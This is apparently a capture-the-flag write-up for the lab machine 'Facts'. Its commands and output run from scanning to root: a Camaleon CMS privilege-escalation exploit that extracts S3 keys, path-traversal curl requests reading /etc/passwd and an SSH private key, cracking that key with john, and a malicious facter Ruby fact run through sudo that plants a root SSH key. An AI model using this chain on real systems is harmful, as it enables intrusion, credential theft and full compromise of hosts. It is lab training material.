# Facts

```console
$ sudo nmap 10.129.244.96 -n -Pn -sCVS -A -p- --min-rate 10000 -vv
```

```text
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    syn-ack ttl 62 Golang net/http server
|_http-server-header: MinIO
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18E65C00B04C12D1
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Nov 2026 11:10:59 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18E65C00B04C12D1</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18E65BFCED911A3E
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Nov 2026 11:10:43 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18E65BFCED911A3E</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 09 Nov 2026 11:10:43 GMT
|_    Content-Length: 0
| http-methods:
|_  Supported Methods: GET OPTIONS
|_http-title: Did not follow redirect to http://10.129.244.96:9001
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.95%I=7%D=11/9%Time=6AF1AA52%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAc
SF:cept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20app
SF:lication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-a
SF:ge=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20
SF:dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-A
SF:mz-Request-Id:\x2018E65BFCED911A3E\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2009\x20No
SF:v\x202026\x2011:10:43\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encod
SF:ing=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x2
SF:0Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Req
SF:uestId>18E65BFCED911A3E</RequestId><HostId>dd9025bab4ad464b049177c95eb6
SF:ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,5
SF:9,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Mon,\x2009\x20
SF:Nov\x202026\x2011:10:43\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x2
SF:0400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x2
SF:0303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-
SF:Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\
SF:x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af
SF:9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x2018E65C00B04C12D1\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\
SF:r\nDate:\x20Mon,\x2009\x20Nov\x202026\x2011:10:59\x20GMT\r\n\r\n<\?xml\
SF:x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReque
SF:st</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Messag
SF:e><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>18E6
SF:5C00B04C12D1</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3f
SF:d1af9251148b658df7ac2e3e8</HostId></Error>");
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/9%OT=22%CT=1%CU=39953%PV=Y%DS=2%DC=T%G=Y%TM=6AF1AA6
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M
OS:552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%
OS:O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
OS:DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 31.191 days (since Fri Oct  9 02:35:56 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   84.92 ms 10.10.14.1
2   85.33 ms 10.129.244.96
```

---

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt -x php,zip,txt,html -t 100
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
....
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
....
```

---

## Registr new user:

```text
username: test
password: password
```

---

```bash
git clone https://github.com/Alien0ne/CVE-2025-2304.git
cd CVE-2025-2304.git
pip install requests
python exploit.py -u http://facts.htb -U test1 -P test -e -r
```

```text
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 6
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 6
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIA7249EBB46FE53131
   s3 secret key: LFVPms1CTBxOJcmdk2eyerbZeuX3NfbxdfDEo7lE
   s3 endpoint: http://localhost:54321
[+]Reverting User Role
   User ID: 6
   User Role: client
```

---

## Extracting S3 Credentials:

```text
   s3 access key: AKIA7249EBB46FE53131
   s3 secret key: LFVPms1CTBxOJcmdk2eyerbZeuX3NfbxdfDEo7lE
   s3 endpoint: http://localhost:54321
```

---

```bash
aws configure --profile facts
```

```text
AWS Access Key ID [None]: AKIA7249EBB46FE53131
AWS Secret Access Key [None]: LFVPms1CTBxOJcmdk2eyerbZeuX3NfbxdfDEo7lE
Default region name [None]: us-east-1
Default output format [None]: json
```

---

```bash
aws --profile facts --endpoint-url http://facts.htb:54321 s3 ls s3://internal/
```

```text
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
```

---

```bash
curl -X "GET" "http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd" -H "Accept-Language: en-US,en;q=0.9" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Encoding: gzip, deflate, br" -H "Cookie: auth_token=EjCTKR2gvsEIAVjr2JolCQ&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F143.0.0.0+Safari%2F537.36&10.10.14.227; _factsapp_session=3QskCTcEcN38a5XcXvG8mvYRFlQufOZjUybniX6KlETIzsX6NdhaST805gVkHVKhZcvYpggnp%2BS8HkdlRAmvTCabgXnYOQUukm5XFmR3Co5cbpG06VJ0SJ89zWSP35KOmKLO4XfHNXRtiM8AqT0l%2BpEzu14ovdIQGLs%2Bo35x%2FNUr3WJl2JX0WMW7apHnwoL3V7AHFE%2BUjpXBy1bz9urzxFm9T1A%2FvY6P4PB%2FxxZlBnWHs6i%2FVKa%2BFZdJXCFWXs%2BXDyNziOW8P9x8mDu%2F4a7ovykCJlzKTP35aPajEDFOLnDNaFaAP2ThbPaRltLXCDLLsrlFCQA%3D--WuKWhX%2BEg%2BqYYn4r--dNrMOLgfQ%2BQsK87MhxI9Rw%3D%3D" -H "Connection: keep-alive"
```

```text
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
...
```

---

```bash
curl -X "GET" "http://facts.htb/admin/media/download_private_file?file=../../../home/william/user.txt" -H "Accept-Language: en-US,en;q=0.9" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Encoding: gzip, deflate, br" -H "Cookie: auth_token=EjCTKR2gvsEIAVjr2JolCQ&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F143.0.0.0+Safari%2F537.36&10.10.14.227; _factsapp_session=3QskCTcEcN38a5XcXvG8mvYRFlQufOZjUybniX6KlETIzsX6NdhaST805gVkHVKhZcvYpggnp%2BS8HkdlRAmvTCabgXnYOQUukm5XFmR3Co5cbpG06VJ0SJ89zWSP35KOmKLO4XfHNXRtiM8AqT0l%2BpEzu14ovdIQGLs%2Bo35x%2FNUr3WJl2JX0WMW7apHnwoL3V7AHFE%2BUjpXBy1bz9urzxFm9T1A%2FvY6P4PB%2FxxZlBnWHs6i%2FVKa%2BFZdJXCFWXs%2BXDyNziOW8P9x8mDu%2F4a7ovykCJlzKTP35aPajEDFOLnDNaFaAP2ThbPaRltLXCDLLsrlFCQA%3D--WuKWhX%2BEg%2BqYYn4r--dNrMOLgfQ%2BQsK87MhxI9Rw%3D%3D" -H "Connection: keep-alive"
```

```text
8cdbc4a15ed4c71db83d042f7ff930ce
```

---

```bash
curl -X "GET" "http://facts.htb/admin/media/download_private_file?file=../../../home/trivia/.ssh/id_ed25519" -H "Accept-Language: en-US,en;q=0.9" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Encoding: gzip, deflate, br" -H "Cookie: auth_token=EjCTKR2gvsEIAVjr2JolCQ&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F143.0.0.0+Safari%2F537.36&10.10.14.227; _factsapp_session=3QskCTcEcN38a5XcXvG8mvYRFlQufOZjUybniX6KlETIzsX6NdhaST805gVkHVKhZcvYpggnp%2BS8HkdlRAmvTCabgXnYOQUukm5XFmR3Co5cbpG06VJ0SJ89zWSP35KOmKLO4XfHNXRtiM8AqT0l%2BpEzu14ovdIQGLs%2Bo35x%2FNUr3WJl2JX0WMW7apHnwoL3V7AHFE%2BUjpXBy1bz9urzxFm9T1A%2FvY6P4PB%2FxxZlBnWHs6i%2FVKa%2BFZdJXCFWXs%2BXDyNziOW8P9x8mDu%2F4a7ovykCJlzKTP35aPajEDFOLnDNaFaAP2ThbPaRltLXCDLLsrlFCQA%3D--WuKWhX%2BEg%2BqYYn4r--dNrMOLgfQ%2BQsK87MhxI9Rw%3D%3D" -H "Connection: keep-alive" > id_ed25519
```

---

```bash
cat id_ed25519
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDcEhJoy7
vsPdgpXYOcYJ5CAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIByOeXHkygHDDDUk
PQhrWpmqYwYpeUVwK5sv1hv4Pn3AAAAAoObqtLIQWb6gIPeI46o66b0UD+ZCyxNkyGh940
gnYBG83BNd427n8Brt+AnUlV6+kRb+YuSDxrOYTFSOwyCekDBvevjy09N9y3sPl8MYtYRz
Ix1I8Hs/9cr+th1kS7VVqwMYtF05c/6h1DhDIuFzjRE3ETjxrnnLF5t8zoixE8ckqw8DOU
mBB4RswWLtDHvAZehCX73TV4rjflTmQ+qBqEo=
-----END OPENSSH PRIVATE KEY-----
```

---

```bash
ssh2john id_ed25519 > hash
```

---

```bash
cat hash
```

```text
id_ed25519:$sshng$6$16$dc121268cbbbec3dd8295d839c609e42$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010dc121268cbbbec3dd8295d839c609e420000001800000001000000330000000b7373682d65643235353139000000201c8e7971e4ca01c30c35243d086b5a99aa6306297945702b9b2fd61bf83e7dc0000000a0e6eab4b21059bea020f788e3aa3ae9bd140fe642cb1364c8687de348276011bcdc135de36ee7f01aedf809d4955ebe9116fe62e483c6b3984c548ec3209e90306f7af8f2d3d37dcb7b0f97c318b58473231d48f07b3ff5cafeb61d644bb555ab0318b45d3973fea1d4384322e1738d11371138f1ae79cb179b7cce88b113c724ab0f0339498107846cc162ed0c7bc065e8425fbdd3578ae37e54e643ea81a84a$24$130
```

---

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
...
dragonballz      (id_ed25519)

1g 0:00:01:45 DONE (2026-11-10 05:10) 0.009497g/s 30.39p/s 30.39c/s 30.39C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

---

```bash
john --show ./hash
```

```text
id_ed25519:dragonballz
```

---

```text
username: trivia
passphrase: dragonballz
```

---

```console
ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': dragonballz

trivia@facts:~$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```

---

```bash
sudo -l
```

```text
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

---

```console
trivia@facts:~$ mkdir -p /tmp/root
trivia@facts:~$ cat > /tmp/root/exploit.rb << 'RUBY'
Facter.add("exploit") do
  setcode do
    system("mkdir -p /root/.ssh && chmod 700 /root/.ssh")
    system("echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIByOeXHkygHDDDUkPQhrWpmqYwYpeUVwK5sv1hv4Pn3A' >> /root/.ssh/authorized_keys")
    system("chmod 600 /root/.ssh/authorized_keys")
    "done"
  end
end
RUBY
```

---

```bash
sudo /usr/bin/facter --custom-dir /tmp/root exploit
```

```text
done
```

---

```console
trivia@facts:~$ ssh -i .ssh/id_ed25519 root@facts.htb
Enter passphrase for key '.ssh/id_ed25519':

root@facts:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

```console
root@facts:~# cat root.txt

f491c63ad1b6bac7ef6861f1505f3d9a
```
